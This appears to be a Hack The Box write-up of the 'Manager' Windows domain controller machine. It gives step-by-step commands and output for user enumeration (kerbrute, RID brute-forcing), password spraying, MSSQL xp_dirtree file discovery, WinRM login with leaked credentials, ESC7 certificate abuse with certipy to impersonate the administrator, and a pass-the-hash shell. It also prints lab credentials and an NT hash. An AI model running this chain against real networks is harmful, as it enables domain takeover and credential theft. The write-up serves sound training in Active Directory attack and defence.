https://www.hackthebox.com/achievement/machine/1777380/572
based on machine info :
**What is RID Cycling?**  
In Active Directory (AD), each user has a unique **Relative Identifier (RID)**, which is part of their **Security Identifier (SID)**. The **Domain Administrator** typically has a well-known RID of **500**, while other users have incrementing RIDs.

**Why is it useful?**  
If an attacker can list existing RIDs, they can infer valid usernames in the domain without authentication. This is called **RID cycling**—it allows attackers to enumerate domain users by cycling through possible RIDs and identifying which ones exist.

---
### **Abusing xp_dirtree for Filesystem Enumeration**

**What is xp_dirtree?**  
`xp_dirtree` is an **extended stored procedure** in MSSQL that lists the directory structure of a specified path. It was designed for database operations but can be abused to enumerate the file system and uncover sensitive files.
**Why is it a security risk?**
-It allows attackers to list directories without direct access to the system.
-If misconfigured, it can be exploited to read unauthorized files or interact with SMB shares.

---
### **Privilege Escalation via AD CS (ESC7)**

**What is Active Directory Certificate Services (AD CS)?**  
AD CS is a Microsoft service that provides Public Key Infrastructure (PKI) for issuing digital certificates. These certificates can be used for authentication instead of passwords.
**What is ESC7?**  
ESC7 is an **Active Directory Certificate Services (AD CS) misconfiguration** where low-privileged users can request a certificate that grants them **privileged authentication tokens**.

**How does an attacker exploit ESC7?**
1. The attacker identifies an AD CS template that allows **low-privileged users** to request authentication certificates.
2. They generate a certificate and use it to obtain a Kerberos **TGT (Ticket Granting Ticket)** as an administrator.
3. This allows them to authenticate as an admin and escalate privileges.

---
## enumeration
IP = 10.10.11.236

```bash
┌──(pwn㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- 10.10.11.236 

```

```bash
10.10.11.236	dc01.manager.htb manager.htb  in /etc/hotst
```

-mssql <> kerber roasting <> service principle name (SPN)
-check the website port 80

```bash
┌──(pwn㉿kali)-[~]
└─$ smbclient -L 10.10.11.236 
Password for [WORKGROUP\pwn]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 

```
-kerbrute
```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ sudo ./kerbrute  -h
```

```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ sudo ./kerbrute userenum -d manager.htb --dc 10.10.11.236 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

pre-auth check
----
ryan@manager.htb
guest@manager.htb
cheng@manager.htb
raven@manager.htb
administrator@manager.htb
Ryan@manager.htb
Raven@manager.htb
operator@manager.htb
Guest@manager.htb
Administrator@manager.htb
Cheng@manager.htb
----
```
If a **valid** username is provided but the password is wrong, Kerberos returns **`KRB5KDC_ERR_PREAUTH_REQUIRED`** (Pre-authentication required).
1. If an **invalid** username is provided, Kerberos returns **`KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN`** (User does not exist).
By cycling through a large username list, Kerbrute can determine which usernames **exist** in the target domain
-or
```bash
sudo ntpdate 10.10.11.236  <> sync clock with domain controler
```
---
-RID brute force no wordlist needed , no account blocks
```bash

┌──(pwn㉿kali)-[~]
└─$ netexec smb 10.10.11.236 -u 'guest' -p '' --rid-brute
it actuakly look for knows sid

-SMB         10.10.11.236    445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
sample output

```
-- When running **RID brute-forcing**, your goal is to enumerate **Security Identifiers (SIDs)** of users and groups.
- The method works by taking a known SID structure and **incrementing the RID values** to guess new user accounts.
---
-make file with user accounts (lower case , upper case)
-lets make password list with user names
```bash
┌──(pwn㉿kali)-[~]
└─$ netexec smb 10.10.11.236 -u user.txt -p pas.txt --no-bruteforce --continue-on-success
 it will check sequence no brute force randomly

nxdb 
smb > creds
cred ID = use the id 


netexec 10.10.11.236 -id (id)

```
---
```bash
┌──(pwn㉿kali)-[~]
└─$ netexec mssql 10.10.11.236 -u operator -p operator   
MSSQL       10.10.11.236    1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
MSSQL       10.10.11.236    1433   DC01             [+] manager.htb\operator:operator 

```

## pre-exploitation

```bash
──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 mssqlclient.py manager/operator:operator@10.10.11.236 -windows-auth

SQL (MANAGER\Operator  guest@master)> 

```

```mssql
SQL (MANAGER\Operator  guest@master)> xp_dirtree c://

```

-inetpub is **the folder on a computer that is the default folder for Microsoft Internet Information Services (IIS**
```mssql
SQL (MANAGER\Operator  guest@master)> xp_dirtree c://inetpub/wwwroot

---
website-backup-27-07-23-old.zip       1      1   

```
-this mean if we went back to `http://manager.htb/website-backup-27-07-23-old.zip` , we will download the .zip file

```bash
unzip
ls -al
-rw-rw-r--  1 pwn pwn      698 Jul 27  2023 .old-conf.xml
──(pwn㉿kali)-[~/Downloads]
└─$ cat .old-conf.xml 
<user>raven@manager.htb</user><password>R4v3nBe5tD3veloP3r!123</password>

```
raven
R4v3nBe5tD3veloP3r!123
```bash
netexec winrm 10.10.11.236 -u 'raven' -p  'R4v3nBe5tD3veloP3r!123'
```

```bash
┌──(pwn㉿kali)-[~]
└─$ netexec winrm 10.10.11.236 -u 'raven' -p  'R4v3nBe5tD3veloP3r!123'
WINRM       10.10.11.236    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
WINRM       10.10.11.236    5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)

```

```bash
┌──(pwn㉿kali)-[~]
└─$ evil-winrm -i 10.10.11.236 -u 'raven' -p  'R4v3nBe5tD3veloP3r!123'

```

```bash
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Raven\Documents>

```

## post-exploitation
![[Pasted image 20250205102009.png]]

```
┌──(pwn㉿kali)-[/opt/SharpCollection/NetFramework_4.7_Any]
└─$ ls
or download it from github

```
.\Certify.exe find /vulnerable
```bash
*Evil-WinRM* PS C:\Users\Raven\desktop> upload Certify.exe
*Evil-WinRM* PS C:\Users\Raven\desktop> .\Certify.exe find /vulnerable

```
or
```bash
┌──(pwn㉿kali)-[~]
└─$ certipy find -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -stdout -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)
    
CA : manager-DC01-CA


[!] Vulnerabilities
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions

```
-check the great  link below
https://www.thehacker.recipes/ad/movement/adcs/access-controls
```bash
──(pwn㉿kali)-[~]
└─$ certipy ca -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -list-template    
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Enabled certificate templates on 'manager-dc01-ca':
    SubCA
    DirectoryEmailReplication
    DomainControllerAuthentication
    KerberosAuthentication
    EFSRecovery
    EFS
    DomainController
    WebServer
    Machine
    User
    Administrator

```

If `raven` has enrollment rights on a **privileged** template, request a certificate
**What is happening?**
```bash
┌──(pwn㉿kali)-[~]
└─$ certipy ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
                                                                                                                   
┌──(pwn㉿kali)-[~]
└─$ certipy req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 19
Would you like to save the private key? (y/N) y
[*] Saved private key to 19.key
[-] Failed to request certificate
                                                                                                                   
┌──(pwn㉿kali)-[~]
└─$ certipy ca -ca manager-DC01-CA -issue-request 19 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
                                                                                                                   
┌──(pwn㉿kali)-[~]
└─$ certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 19 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 19
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '19.key'
[*] Saved certificate and private key to 'administrator.pfx'

```
- `certipy req`: Requests a certificate.
- `-u 'raven' -p 'R4v3nBe5tD3veloP3r!123'`: Authenticates as the `raven` user.
- `-dc-ip 10.10.11.236`: Connects to the domain controller (Certificate Authority server).
- `-ca manager-dc01-ca`: Specifies the **Certificate Authority** in the domain.
- `-template SubCA`: Requests a **certificate from the `SubCA` template**.
- `-upn administrator@manager.htb`: Sets the **User Principal Name (UPN) to impersonate `administrator`**.

```bash
┌──(pwn㉿kali)-[~]
└─$ sudo timedatectl set-ntp false

                                                                                                                   
┌──(pwn㉿kali)-[~]
└─$ sudo ntpdate -u 10.10.11.236                           

2025-02-05 11:04:46.553838 (-0500) +25199.506187 +/- 0.039181 10.10.11.236 s1 no-leap
CLOCK: time stepped by 25199.506187
                                                                                                                   
┌──(pwn㉿kali)-[~]
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
                                                                                                                   
┌──(pwn㉿kali)-[~]
└─$ sudo timedatectl set-ntp true                          

[sudo] password for pwn: 

```

```bash
python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef administrator@10.10.11.236

```

![[Pasted image 20250205121034.png]]

![[Pasted image 20250205121046.png]]